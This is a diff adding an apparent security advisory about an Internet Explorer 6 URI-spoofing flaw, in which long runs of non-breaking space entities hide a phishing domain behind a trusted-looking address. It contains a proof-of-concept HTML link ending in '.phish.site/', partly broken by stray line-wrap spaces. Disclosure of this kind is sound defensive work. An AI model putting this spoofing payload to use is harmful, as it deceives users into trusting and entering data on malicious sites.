@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/31960/info
+
+Internet Explorer is affected by a URI-spoofing vulnerability because it fails to adequately handle specific combinations of the non-breaking space character ('&NBSP;').
+
+An attacker may leverage this issue to spoof the source URI of a site presented to an unsuspecting user. This may lead to a false sense of trust because the user may be presented with a source URI of a trusted site while interacting with the attacker's malicious site.
+
+Internet Explorer 6 is affected by this issue. 
+
+<a href="http://www.example.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n <http://www.example.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n/> bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;& nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n bsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;.phish.site/">Example</a> (In words, this is <a href="http://www.example.com <http://www.example.com/> followed by 30 ampersand-NBSP-semicolon, followed by a dot followed by another 31 ampersand-NBSP-semicolon followed by a dot, followed by 13 ampersand-NBSP-semicolon followed by a dot followed by phish.site/">Example</a>) This causes a link whose URL appears, IN THE ADDRESS BAR, as (may wrap around): http://www.example.com . . .phish.site/ (In words, this appears like "http://www.example.com" <http://www.example.com%22/> ; followed by 30 spaces, a dot, 31 spaces, a dot, 13 spaces, a dot and finally "phish.site/") 
